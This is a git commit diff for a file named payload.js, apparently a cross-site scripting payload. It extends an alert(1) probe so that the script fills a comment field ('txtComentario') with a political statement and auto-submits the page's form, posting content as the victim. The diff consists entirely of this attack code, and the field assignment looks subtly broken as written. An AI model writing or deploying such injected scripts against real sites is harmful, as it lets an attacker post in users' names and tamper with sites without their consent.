8b79cca588cf6c47ed37ca9af66d12c47d6bfe19
lautarotetamusa <lautarotetamusa@gmail.com>
2023-11-19 19:18:09 -0300

    a

--- payload.js
+++ payload.js
@@ -1,2 +1,4 @@
-console.log("hola")
-alert(1)
+console.log("hola");
+alert(1);
+document.getElementsByName("txtComentario").value = "Voy a derogar la ley 1542-A";
+document.getElementsByTagName("form")[0].submit();
